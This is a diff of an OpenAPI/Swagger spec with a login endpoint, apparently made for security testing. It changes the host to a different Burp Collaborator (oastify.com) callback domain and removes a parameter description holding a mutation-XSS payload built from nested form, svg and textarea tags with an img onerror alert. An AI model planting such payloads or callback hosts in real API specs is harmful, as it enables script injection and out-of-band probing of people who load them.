@@ -3,7 +3,7 @@ info:
   version: "v1"
   title: Please login first
 
-host: s5y2oj6ptxj2kmis1fg37b9cg3mxaryg.oastify.com
+host: hf0upqeib3kar4e7wq0kvvv0nrtihb50.oastify.com
 
 paths:
 
@@ -11,7 +11,6 @@ paths:
     post:
       summary: Logs in
       parameters:
-        - description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
         - name: Username 
           required: true
           in: path
